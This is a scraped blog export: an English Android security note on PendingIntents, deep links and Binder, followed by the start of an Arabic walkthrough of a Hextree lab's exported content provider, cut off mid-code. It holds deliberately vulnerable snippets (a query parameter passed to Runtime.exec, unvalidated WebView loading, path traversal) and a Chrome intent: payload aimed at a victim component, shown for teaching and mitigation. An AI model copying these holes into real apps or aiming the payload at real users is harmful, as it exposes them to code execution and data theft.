setResult(RESULT_OK, resultIntent); finish(); PendingIntents # [!info] Definition: A PendingIntent allows one application to grant another application permission to execute a predefined action on its behalf, even if the creator app is no longer running.\nIt\u0026rsquo;s often used in scenarios where you want to allow an action to be performed in the future, even if your application is not running.\nHence PendingIntent can be used with different components using methods like :\nPendingIntent.getActivity() : Retrieve a PendingIntent to start an Activity PendingIntent.getBroadcast() : Retrieve a PendingIntent to perform a Broadcast PendingIntent.getService() : Retrieve a PendingIntent to start a Service [!example] Example Imagine that you have a non exported activity A which can be launched from your own application‚Äôs activities. You want though other applications to be able to call A under specific conditions. This is where the pending intent comes to place. The idea is to wrap a normal intent (base intent) that you would use to start activity A into an object, send this object to the other application and let the other application to unwrap the intent and send it back to activity A. Dimitrios Valsamaras (+Chopin) : Pending Intents: A Pentester‚Äôs view\nCode Example:\nYou want to show a notification, and when the user clicks it, it opens a NonExportedActivity within your app using a PendingIntent.\n// Step 1: Create base Intent for non-exported activity Intent intent = new Intent(this, NonExportedActivity.class); intent.putExtra(\u0026#34;msg\u0026#34;, \u0026#34;Hello from PendingIntent!\u0026#34;); // Step 2: Wrap Intent in PendingIntent with security flags PendingIntent pendingIntent = PendingIntent.getActivity( this, // Context 0, // requestCode intent, // Base Intent PendingIntent.FLAG_IMMUTABLE // Security flag ); // Step 3: Use in notification NotificationCompat.Builder builder = new NotificationCompat.Builder(this, channelId) .setSmallIcon(R.drawable.ic_launcher_foreground) .setContentTitle(\u0026#34;PendingIntent Demo\u0026#34;) .setContentText(\u0026#34;Click to launch NonExportedActivity\u0026#34;) .setAutoCancel(true) .setContentIntent(pendingIntent); // Attach PendingIntent notificationManager.notify(1, builder.build()); NonExportedActivity.java\nString msg = getIntent().getStringExtra(\u0026#34;msg\u0026#34;); TextView textView = findViewById(R.id.textView); textView.setText(msg); PendingIntent Flags\nFlag Value Description FLAG_MUTABLE 33554432 Allows intent data/extras to be changed FLAG_IMMUTABLE 67108864 Locks intent - recommended for security FLAG_ONE_SHOT - Prevents replay attacks How to create a pending intent # Each section focuses on a specific functionality or use case, making the code easier to understand and maintain. The methods are separated logically, and related functionality is grouped together.\n1. Creating Activity PendingIntent # // Method to create a PendingIntent for starting an Activity private PendingIntent createActivityPendingIntent() { // Step 1: Create the base Intent with explicit component Intent baseIntent = new Intent(\u0026#34;My.Action\u0026#34;); baseIntent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.TargetActivity\u0026#34;); // Step 2: Create PendingIntent with FLAG_IMMUTABLE for security return PendingIntent.getActivity( this, // Context 0, // Request code baseIntent, // Base Intent PendingIntent.FLAG_IMMUTABLE // Security flag ); } 2. Creating Service PendingIntent # // Method to create a PendingIntent for a Service private PendingIntent createServicePendingIntent() { Intent serviceIntent = new Intent(\u0026#34;My.Service.Action\u0026#34;); serviceIntent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.MyService\u0026#34;); return PendingIntent.getService( this, 0, serviceIntent, PendingIntent.FLAG_IMMUTABLE ); } 3. Creating Broadcast PendingIntent # // Method to create a PendingIntent for a Broadcast private PendingIntent createBroadcastPendingIntent() { Intent broadcastIntent = new Intent(\u0026#34;My.Broadcast.Action\u0026#34;); broadcastIntent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.MyBroadcastReceiver\u0026#34;); return PendingIntent.getBroadcast( this, 0, broadcastIntent, PendingIntent.FLAG_IMMUTABLE ); } 4. Creating One-Shot PendingIntent # // Method to create a one-shot PendingIntent (can only be used once) private PendingIntent createOneShotPendingIntent() { Intent intent = new Intent(\u0026#34;My.OneShot.Action\u0026#34;); intent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.OneShotActivity\u0026#34;); return PendingIntent.getActivity( this, 0, intent, PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT ); } 5. Sending PendingIntent to Another App # // Method to send PendingIntent to another app private void sendPendingIntentToAnotherApp() { // Create the PendingIntent PendingIntent pendingIntent = createActivityPendingIntent(); // Create Intent to target another app Intent targetAppIntent = new Intent(); targetAppIntent.setClassName(\u0026#34;com.example.otherapp\u0026#34;, \u0026#34;com.example.otherapp.ReceiverActivity\u0026#34;); // Add PendingIntent as extra targetAppIntent.putExtra(\u0026#34;pendingIntent\u0026#34;, pendingIntent); // Start the other app\u0026#39;s activity startActivity(targetAppIntent); } 6. Using PendingIntent with Notification # // Method to use PendingIntent with NotificationManager (common use case) private void createNotificationWithPendingIntent() { // Create PendingIntent PendingIntent pendingIntent = createActivityPendingIntent(); // Create notification with PendingIntent NotificationCompat.Builder builder = new NotificationCompat.Builder(this, \u0026#34;channel_id\u0026#34;) .setSmallIcon(R.drawable.ic_notification) .setContentTitle(\u0026#34;My Notification\u0026#34;) .setContentText(\u0026#34;Click to open activity\u0026#34;) .setContentIntent(pendingIntent) // Set the PendingIntent .setAutoCancel(true); NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE); notificationManager.notify(1, builder.build()); } 7. Using PendingIntent with AlarmManager # // Method to use PendingIntent with AlarmManager private void scheduleAlarmWithPendingIntent() { // Create PendingIntent for broadcast PendingIntent alarmIntent = createBroadcastPendingIntent(); // Schedule alarm AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE); long triggerTime = System.currentTimeMillis() + 60000; // 1 minute from now alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, alarmIntent); } 8. Receiver Activity (Separate Class) # // Example of receiving and using a PendingIntent in another app public class ReceiverActivity extends AppCompatActivity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_receiver); // Retrieve PendingIntent from the Intent extras Intent intent = getIntent(); PendingIntent receivedPendingIntent = intent.getParcelableExtra(\u0026#34;pendingIntent\u0026#34;); if (receivedPendingIntent != null) { try { // Send/execute the PendingIntent receivedPendingIntent.send(); } catch (PendingIntent.CanceledException e) { Log.e(\u0026#34;ReceiverActivity\u0026#34;, \u0026#34;PendingIntent was cancelled\u0026#34;, e); } } } } 9. Mutable PendingIntent Example (Separate Class) # // Example with mutable PendingIntent (use with caution) public class MutablePendingIntentExample { private PendingIntent createMutablePendingIntent(Context context) { Intent baseIntent = new Intent(\u0026#34;My.Mutable.Action\u0026#34;); baseIntent.setClassName(\u0026#34;com.example.myapp\u0026#34;, \u0026#34;com.example.myapp.MutableActivity\u0026#34;); // Only use FLAG_MUTABLE when absolutely necessary return PendingIntent.getActivity( context, 0, baseIntent, PendingIntent.FLAG_MUTABLE // Use with extreme caution ); } } Pending Intent Attacks \u0026amp; Mitigations # Mutable PendingIntents # [!danger] By default, PendingIntents were historically mutable (until Android R). Malicious apps can modify the inner Intent, potentially accessing non-exported components.\nAttack Scenarios:\nNotification Hijack Malicious app with notification listener permission fetches PendingIntent Modifies Intent to launch attacker\u0026rsquo;s activity with victim\u0026rsquo;s permissions Permission Escalation App A has READ_CONTACTS permission, creates mutable PendingIntent App B modifies Intent to read contacts without having the permission Replay Attacks # [!danger] Risk\nPendingIntents can be replayed unless FLAG_ONE_SHOT is set, allowing malicious apps to repeat actions multiple times.\nMitigation # 1. Set Explicit Components # Intent intent = new Intent(intentAction); // Explicitly set component to prevent redirection intent.setClassName(packageName, className); PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, intent, PendingIntent.FLAG_IMMUTABLE ); 2. Use FLAG_IMMUTABLE # If your app targets Android 6 (API level 23) or higher, specify mutability.\n// For Android 6+ (API 23), strongly recommended // For Android 11+ (API 30), mutability must be specified PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, new Intent(intentAction), PendingIntent.FLAG_IMMUTABLE ); 3. Prevent Replay Attacks # // For one-time actions PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, new Intent(intentAction), PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_ONE_SHOT ); [!warning] Critical Security Rule Always ensure the base Intent wrapped in PendingIntent has the component name explicitly set to one of your own components.\nDeep Links # [!info] A deep link is ==a special type of hyperlink that allows users to navigate directly to a specific page or content within an app, bypassing the app\u0026rsquo;s homepage==. This is done by declaring what the component will accepts through it\u0026rsquo;s filters\nHow Deep Links Work # ![[Pasted image 20250713181259.png]]\nFor an application to handle deep links it requires:\nIntent Filter Required - Activity must have intent filter in AndroidManifest.xml Exported Activity - Must be explicitly exported (android:exported=\u0026quot;true\u0026quot;) URI Scheme Definition - Specify scheme, host, and path in \u0026lt;data\u0026gt; tag In Details:\nThe action need to be action.VIEW\nCategory\nDEFALUT : to handle implicit intents without specifying the component name BROWSABLE : allow browsers to open the link in your app. Data:\nDefine the URI format with at least android:scheme Optionally use android:path, pathPrefix, or pathPattern to refine which URIs open this activity. (if no data is set ) : The Chrome intent: scheme solves this by allowing a site to create explicit intents Chrome on Android implements a custom scheme intent: with a lot more features than the regular deep links. Which make them very useful for an attacker.\nintent: features:\nIt\u0026rsquo;s a generic intent Control the action and category Target specific app and class Add extra values Deep Link Manifest Example # [!warning] Intent Filter Separation Create separate intent filters for different URL schemes. Multiple \u0026lt;data\u0026gt; elements in the same filter can create unintended combinations.\nThe following XML snippet shows an intent filter deep linking. The URIs ‚Äúexample://gizmos‚Äù and ‚Äúhttp://www.example.com/gizmos‚Äù both resolve to this activity.\n\u0026lt;activity android:name=\u0026#34;com.example.android.GizmosActivity\u0026#34; android:label=\u0026#34;@string/title_gizmos\u0026#34; android:exported=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;intent-filter android:label=\u0026#34;@string/filter_view_http_gizmos\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34; /\u0026gt; \u0026lt;!-- HTTP/HTTPS deep link --\u0026gt; \u0026lt;data android:scheme=\u0026#34;http\u0026#34; android:host=\u0026#34;www.example.com\u0026#34; android:pathPrefix=\u0026#34;/gizmos\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;intent-filter android:label=\u0026#34;@string/filter_view_example_gizmos\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34; /\u0026gt; \u0026lt;!-- Custom scheme deep link --\u0026gt; \u0026lt;data android:scheme=\u0026#34;example\u0026#34; android:host=\u0026#34;gizmos\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; But what will happen if we didn\u0026rsquo;t separate the data? Although it\u0026rsquo;s possible to include multiple \u0026lt;data\u0026gt; elements in the same filter, it\u0026rsquo;s important that you create separate filters when your intention is to declare unique URLs\nProblem Example:\n\u0026lt;!-- DON\u0026#39;T DO THIS - Creates unintended combinations --\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34; android:host=\u0026#34;www.example.com\u0026#34; /\u0026gt; \u0026lt;data android:scheme=\u0026#34;app\u0026#34; android:host=\u0026#34;open.my.app\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;!-- This accepts: https://www.example.com, app://open.my.app --\u0026gt; \u0026lt;!-- But also: app://www.example.com, https://open.my.app --\u0026gt; It might seem as though this supports only https://www.example.com and app://open.my.app. However, it actually supports those two, plus these: app://www.example.com and https://open.my.app thus adding more attack vectors\nTypes of Deep Links # 1. General Deep Links # Definition: URIs of any scheme (geo:, example://, vaadata://) Behavior: May trigger disambiguation dialog if multiple apps can handle the URI Implementation: Requires standard intent filter with VIEW action, DEFAULT and BROWSABLE categories 2. Web Links # Definition: Deep links specifically using HTTP and HTTPS schemes Behavior: Android 12+: Always show in browser by default unless app is domain-approved Earlier versions: May show disambiguation dialog Implementation: Same as general deep links but with http/https schemes 3. Android App Links # Definition: Web links with android:autoVerify=\u0026quot;true\u0026quot; (Android 6.0+ API 23+) Behavior: Open immediately if app is verified default handler, bypassing disambiguation Requirements: HTTP/HTTPS schemes only Domain ownership verification required assetlinks.json file on web server Android App Links Implementation # Step 1: Create Intent Filters # \u0026lt;intent-filter android:autoVerify=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34; /\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34; android:host=\u0026#34;yourdomain.com\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; Step 2: Digital Asset Links File # Host assetlinks.json at https://yourdomain.com/.well-known/assetlinks.json:\n[{ \u0026#34;relation\u0026#34;: [\u0026#34;delegate_permission/common.handle_all_urls\u0026#34;], \u0026#34;target\u0026#34;: { \u0026#34;namespace\u0026#34;: \u0026#34;android_app\u0026#34;, \u0026#34;package_name\u0026#34;: \u0026#34;com.example.yourapp\u0026#34;, \u0026#34;sha256_cert_fingerprints\u0026#34;: [\u0026#34;14:6D:E9:83:C5:73:06:50:D8:EE:B9:95:2F:34:FC:64:16:A0:83:42:E6:1D:BE:A8:8A:04:96:B2:3F:CF:44:E5\u0026#34;] } }] Reading Deep Link Data # @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.main); Intent intent = getIntent(); String action = intent.getAction(); Uri data = intent.getData(); // Use \u0026#39;data\u0026#39; and \u0026#39;action\u0026#39; to render appropriate content if (Intent.ACTION_VIEW.equals(action) \u0026amp;\u0026amp; data != null) { // Handle deep link data String scheme = data.getScheme(); String host = data.getHost(); String path = data.getPath(); // Process the URI safely } } Risk \u0026amp; Impact # The security risks associated with deep links stem from their core capability of enabling seamless navigation and interaction within mobile applications. Deep link vulnerabilities arise from weaknesses in the implementation or handling of deep links.\nThey can be hijacked like any other implicit intent if the \u0026lt;intent-filter\u0026gt; are properly setup\nThe lack of a proper deep link validation mechanism, or the unsafe use of deeplinks, can aid malicious users in performing attacks such as host validation bypass, cross-app scripting, and remote code execution within the permissions context of the vulnerable application. Depending on the nature of the application, this can result in unauthorized access to sensitive data or functions. (Developer Docs)\nAn example is some in-app navigation that uses deep links which expose and increase attack surface\nDeep Link Vulnerabilities \u0026amp; Attacks # [!warning] The lack of a proper deep link validation mechanism, or the unsafe use of deeplinks, can aid malicious users in performing attacks such as host validation bypass, cross-app scripting, and remote code execution within the permissions context of the vulnerable application. Depending on the nature of the application, this can result in unauthorized access to sensitive data or functions. (Developer Docs)\nThey can be hijacked like any other implicit intent if the \u0026lt;intent-filter\u0026gt; are properly setup\nSensitive Data Transfer # [!danger] Malicious applications can register intent filters for the same deep links and intercept sensitive data.\nImpact: Account takeover, credential theft, sensitive information exposure\nParameter Injection Attacks # [!danger] Common Vulnerabilities\nCross-Site Scripting (XSS)\n// Vulnerable code String url = getIntent().getData().getQueryParameter(\u0026#34;url\u0026#34;); webView.loadUrl(url); // No validation! Remote Code Execution (RCE)\n// Dangerous - parameter passed to exec String command = getIntent().getData().getQueryParameter(\u0026#34;cmd\u0026#34;); Runtime.getRuntime().exec(command); Path Traversal\n// Vulnerable to ../../../sensitive_file String filename = getIntent().getData().getQueryParameter(\u0026#34;file\u0026#34;); File file = new File(\u0026#34;/app/files/\u0026#34; + filename); WebView-Specific Attacks # [!danger] WebView Vulnerabilities\nArbitrary URL Loading\nStealing authentication tokens Loading malicious content JavaScript Injection\n// Vulnerable concatenation String userInput = getIntent().getData().getQueryParameter(\u0026#34;data\u0026#34;); webView.loadUrl(\u0026#34;javascript:processData(\u0026#39;\u0026#34; + userInput + \u0026#34;\u0026#39;)\u0026#34;); File Access Attacks\nsetAllowFileAccessFromFileURLs(true) enables local file reading setAllowUniversalAccessFromFileURLs(true) allows cross-origin requests JavaScript Interface Exploitation\n// Exposing sensitive methods webView.addJavascriptInterface(new SensitiveAPI(), \u0026#34;Android\u0026#34;); Chrome Intent Scheme Exploitation # Chrome\u0026rsquo;s intent: scheme provides more control than regular deep links:\nintent://example.com/path#Intent; action=android.intent.action.VIEW; category=android.intent.category.BROWSABLE; component=com.victim.app/.VulnerableActivity; S.extra_data=malicious_payload; end; Deep Link Security Mitigations # 1. Use Android App Links # Requires domain ownership verification Prevents other apps from intercepting your links Uses only HTTP/HTTPS (no custom schemes) \u0026lt;!-- App Links configuration --\u0026gt; \u0026lt;intent-filter android:autoVerify=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34; /\u0026gt; \u0026lt;data android:scheme=\u0026#34;https\u0026#34; android:host=\u0026#34;yourdomain.com\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; 2. Robust Data Validation # public boolean isValidDeepLinkUri(Uri uri) { if (uri == null) return false; // Validate scheme String scheme = uri.getScheme(); if (!\u0026#34;https\u0026#34;.equals(scheme)) return false; // Validate host (avoid common bypasses) String host = uri.getHost(); if (host == null || !host.equals(\u0026#34;yourdomain.com\u0026#34;)) return false; // Validate path String path = uri.getPath(); if (path == null || !path.startsWith(\u0026#34;/allowed/\u0026#34;)) return false; return true; } 3. WebView Security Configuration # WebSettings settings = webView.getSettings(); // Disable risky features settings.setGeolocationEnabled(false); settings.setAllowContentAccess(false); settings.setAllowFileAccess(false); // API 29 and lower settings.setAllowFileAccessFromFileURLs(false); settings.setAllowUniversalAccessFromFileURLs(false); // Disable JavaScript if not needed settings.setJavaScriptEnabled(false); // Use WebViewAssetLoader for local assets WebViewAssetLoader assetLoader = new WebViewAssetLoader.Builder() .addPathHandler(\u0026#34;/assets/\u0026#34;, new AssetsPathHandler(this)) .build(); webView.setWebViewClient(new WebViewClient() { @Override public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) { return assetLoader.shouldInterceptRequest(request.getUrl()); } }); 4. Input Sanitization # // Safe parameter handling public String sanitizeParameter(String input) { if (input == null) return \u0026#34;\u0026#34;; // Remove dangerous characters input = input.replaceAll(\u0026#34;[\u0026lt;\u0026gt;\\\u0026#34;\u0026#39;\u0026amp;]\u0026#34;, \u0026#34;\u0026#34;); // Validate against whitelist if (!input.matches(\u0026#34;[a-zA-Z0-9_-]+\u0026#34;)) { throw new SecurityException(\u0026#34;Invalid parameter format\u0026#34;); } return input; } 5. Content Provider Security # // Prevent path traversal public String getSecurePath(String fileName) throws IOException { File baseDir = new File(\u0026#34;/app/safe_directory/\u0026#34;); File requestedFile = new File(baseDir, fileName); // Canonicalize paths to prevent traversal String basePath = baseDir.getCanonicalPath(); String requestedPath = requestedFile.getCanonicalPath(); if (!requestedPath.startsWith(basePath)) { throw new SecurityException(\u0026#34;Path traversal attempt detected\u0026#34;); } return requestedPath; } 6. Safe Browsing Integration # \u0026lt;!-- Enable Safe Browsing in manifest --\u0026gt; \u0026lt;application\u0026gt; \u0026lt;meta-data android:name=\u0026#34;android.webkit.WebView.EnableSafeBrowsing\u0026#34; android:value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;/application\u0026gt; Under The hood ( Android Binder) # [!info] Binder part of android system that allows different Android components to talk to each other safely and efficiently.\n[!example] Think of it like a messenger passing notes between students in class. The Binder makes sure the messages are secure and can\u0026rsquo;t be read by anyone else. It also makes sure the messages are delivered quickly and efficiently, so the students can focus on learning.\nIntent-to-Binder Translation Process # we can trace how a high-level Intent is translated to low-level Binder communications:\nApplication Code: The startActivity(intent) function is called in your application code, requesting that an activity be started.\nIntent Processing: Security checks are performed on the intent to ensure it adheres to Android\u0026rsquo;s permission system. One example of such a check is the prepareToLeaveProcess() method.\nService Interaction: If the intent targets a service, the getService().startActivity(intent) method forwards the request to that service.\nParcel Creation: The intent is serialized into a Parcel object, which acts as a container for the data being sent through Binder.\nNative Transition: A native method called writeStrongBinder() is invoked, transitioning from the application layer to the native interface layer where libbinder (the C++ implementation of Binder) resides.\nBinder Driver: The kernel handles inter-process communication (IPC) through the /dev/binder driver, which manages Binder\u0026rsquo;s communication at a low level.\nTarget Process: Upon receiving the IPC request, the target process deserializes the Parcel object back into an intent, allowing the receiving app to process the incoming\nfor more info go to [[Android Binder]]\nResources \u0026amp; Further Reading # Official Documentation # Android Intents and Intent Filters PendingIntent Documentation App Links Documentation Deep Linking Guide Implicit Intent Hijacking PendingIntent Security Unsafe Deep Link Usage Security References # https://blog.oversecured.com/Interception-of-Android-implicit-intents/ Advanced Topics # WebView Security Best Practices Content Provider Security Android Binder Deep Dive intent\nDocs implicit hijacking Moving from Android StartActivityForResult to registerForActivityResult Docs intents result StartActivityForResult is deprecated Pending intent\nDOCS PendingIntent https://developer.android.com/guide/components/intents-filters#PendingIntent Pending Intents: A Pentester‚Äôs view Hijacking notification Deep links\nDocs deep-linking Deep links from zero to hero medium: Introduction to deep links unsafe-use-of-deeplinks ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/summary/intents/","section":"","summary":"","title":"What is your (Intent)ion","type":"posts"},{"content":"ÿ®ŸÖÿß ÿ•ŸÜŸÜÿß ŸáŸÜÿ™ÿπÿßŸÖŸÑ ŸÖÿπ ŸÇÿßÿπÿØÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿØŸä ŸÉÿ™Ÿäÿ±ÿå ŸÇŸàŸÑÿ™ ŸÖÿß ŸÜÿ®ÿµŸÑŸáÿß ÿßŸÑÿ£ŸàŸÑ ÿπÿ¥ÿßŸÜ ŸÜŸÅŸáŸÖ ÿ•ŸäŸá ÿßŸÑŸÑŸä ÿ•ÿ≠ŸÜÿß ŸáŸÜÿ™ÿπŸÖŸÑ ŸÖÿπÿßŸá:\nŸÇÿßÿπÿØÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ # public class FlagDatabaseHelper extends SQLiteOpenHelper { public static final String COLUMN_CONTENT = \u0026#34;content\u0026#34;; public static final String COLUMN_ID = \u0026#34;_id\u0026#34;; public static final String COLUMN_NAME = \u0026#34;name\u0026#34;; public static final String COLUMN_TITLE = \u0026#34;title\u0026#34;; public static final String COLUMN_VALUE = \u0026#34;value\u0026#34;; public static final String COLUMN_VISIBLE = \u0026#34;visible\u0026#34;; private static final String CREATE_TABKE_NOTE = \u0026#34;CREATE TABLE Note (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, content TEXT NOT NULL );\u0026#34;; private static final String CREATE_TABLE_FLAG = \u0026#34;CREATE TABLE Flag (_id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, value TEXT NOT NULL, visible INTEGER NOT NULL DEFAULT 1);\u0026#34;; private static final String DATABASE_NAME = \u0026#34;flag.db\u0026#34;; private static final int DATABASE_VERSION = 1; public static final String TABLE_FLAG = \u0026#34;Flag\u0026#34;; public static final String TABLE_NOTE = \u0026#34;Note\u0026#34;; public FlagDatabaseHelper(Context context) { super(context, DATABASE_NAME, (SQLiteDatabase.CursorFactory) null, 1); } @Override // android.database.sqlite.SQLiteOpenHelper public void onCreate(SQLiteDatabase sQLiteDatabase) { Log.i(\u0026#34;FlagDatabaseHelper\u0026#34;, \u0026#34;ŸÇÿßÿπÿØÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿßÿ™ÿπŸÖŸÑÿ™\u0026#34;); sQLiteDatabase.execSQL(CREATE_TABLE_FLAG); sQLiteDatabase.execSQL(CREATE_TABKE_NOTE); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag30\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 1);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag31\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 1);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Flag (name, value, visible) VALUES (\u0026#39;flag32\u0026#39;, \u0026#39;HXT{censored}\u0026#39;, 0);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Note (title, content) VALUES (\u0026#39;secret\u0026#39;, \u0026#39;This is a secret note\u0026#39;);\u0026#34;); sQLiteDatabase.execSQL(\u0026#34;INSERT INTO Note (title, content) VALUES (\u0026#39;flag33\u0026#39;, \u0026#39;HXT{censored}\u0026#39;);\u0026#34;); } @Override // android.database.sqlite.SQLiteOpenHelper public void onUpgrade(SQLiteDatabase sQLiteDatabase, int i, int i2) { sQLiteDatabase.execSQL(\u0026#34;DROP TABLE IF EXISTS Flag\u0026#34;); onCreate(sQLiteDatabase); } ŸÖŸÜ ŸáŸÜÿß ŸÜŸÇÿØÿ± ŸÜÿ¥ŸàŸÅ ÿ£ÿ≥ŸÖÿßÿ° ÿßŸÑÿ£ÿπŸÖÿØÿ© ŸàŸÉÿßŸÖ ÿ¨ÿØŸàŸÑ ÿπŸÜÿØŸÜÿß\nŸáŸäŸÉŸÑ ŸÇÿßÿπÿØÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ # ÿßÿ≥ŸÖ ŸÇÿßÿπÿØÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™: flag.db\nÿßŸÑÿ¨ÿØÿßŸàŸÑ:\nÿßŸÑÿßŸàŸÑ Note Ÿà ÿßŸÑÿ´ÿßŸÜŸä Flag ŸÖÿÆÿ∑ÿ∑ ÿ¨ÿØŸàŸÑ Flag # ÿßŸÑÿπŸÖŸàÿØ ÿßŸÑŸÜŸàÿπ ÿßŸÑŸàÿµŸÅ _id INTEGER (PK) ÿ±ŸÇŸÖ ÿ™ÿπÿ±ŸäŸÅ ÿ™ŸÑŸÇÿßÿ¶Ÿä name TEXT ÿßÿ≥ŸÖ ÿßŸÑŸÄ flag (ŸÖÿ´ŸÑÿßŸã flag30, flag31) value TEXT ŸÇŸäŸÖÿ© ÿßŸÑŸÄ flag (ŸÖÿ´ŸÑÿßŸã HXT{censored}) visible INTEGER ÿ•ÿ∞ÿß ŸÉÿßŸÜ ÿ∏ÿßŸáÿ± ŸàŸÑÿß ŸÑÿ£ (1 = ÿ∏ÿßŸáÿ±, 0 = ŸÖÿÆŸÅŸä) ŸÖÿÆÿ∑ÿ∑ ÿ¨ÿØŸàŸÑ Note # ÿßŸÑÿπŸÖŸàÿØ ÿßŸÑŸÜŸàÿπ ÿßŸÑŸàÿµŸÅ _id INTEGER (PK) ÿ±ŸÇŸÖ ÿ™ÿπÿ±ŸäŸÅ ÿ™ŸÑŸÇÿßÿ¶Ÿä title TEXT ÿπŸÜŸàÿßŸÜ ÿßŸÑŸÖŸÑÿßÿ≠ÿ∏ÿ© content TEXT ŸÖÿ≠ÿ™ŸàŸâ ÿßŸÑŸÖŸÑÿßÿ≠ÿ∏ÿ© ÿßŸÑÿ®ŸäÿßŸÜÿßÿ™ ÿßŸÑŸÖÿ≠ŸÖŸÑÿ© ŸÖÿ≥ÿ®ŸÇÿßŸã # ÿ¨ÿØŸàŸÑ Flag (ÿßŸÑÿ•ÿØÿÆÿßŸÑÿßÿ™ ÿßŸÑÿ£ŸàŸÑŸäÿ©) # name value visible flag30 HXT{censored} 1 (ÿ∏ÿßŸáÿ±) flag31 HXT{censored} 1 (ÿ∏ÿßŸáÿ±) flag32 HXT{censored} 0 (ŸÖÿÆŸÅŸä) ÿ¨ÿØŸàŸÑ Note (ÿßŸÑÿ•ÿØÿÆÿßŸÑÿßÿ™ ÿßŸÑÿ£ŸàŸÑŸäÿ©) # title content secret This is a secret note flag33 HXT{censored} ÿØŸÑŸàŸÇÿ™Ÿä ŸäŸÑÿß ŸÜÿ¨Ÿäÿ® ÿßŸÑŸÄ flags ÿ®ÿ™ÿßÿπÿ™ŸÜÿß\nFlag 30 # ÿ™ÿ≠ŸÑŸäŸÑ ÿßŸÑŸÉŸàÿØ # \u0026lt;provider android:name=\u0026#34;io.hextree.attacksurface.providers.Flag30Provider\u0026#34; android:enabled=\u0026#34;true\u0026#34; android:exported=\u0026#34;true\u0026#34; android:authorities=\u0026#34;io.hextree.flag30\u0026#34;/\u0026gt; ÿ®ŸÖÿß ÿ•ŸÜŸá exported ŸàŸÖŸÅŸäÿ¥ ÿ£Ÿä permission ÿ®Ÿäÿ≠ŸÖŸäŸáÿå ŸÜŸÇÿØÿ± ŸÜÿ™ÿµŸÑ ÿ®ŸäŸá ŸàŸÜÿ™ŸÅÿßÿπŸÑ ŸÖÿπÿßŸá ÿ≤Ÿä ŸÖÿß ÿ•ÿ≠ŸÜÿß ÿπÿßŸäÿ≤ŸäŸÜ\npublic class Flag30Provider extends ContentProvider { // ŸÉÿ™Ÿäÿ± ŸÖŸÜ ÿßŸÑŸÄ ŸÖÿ¥ ŸÖÿ™ÿπŸÖŸÑÿ© ŸÅÿ≠ÿ∞ŸÅÿ™ŸáŸÖ methods @Override public Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) { if (!uri.getPath().equals(\u0026#34;/success\u0026#34;)) { return null; } Cursor query = this.dbHelper.getReadableDatabase().query( FlagDatabaseHelper.TABLE_FLAG, // ÿßÿ≥ŸÖ ÿßŸÑÿ¨ÿØŸàŸÑ strArr, // ÿßŸÑÿ£ÿπŸÖÿØÿ© 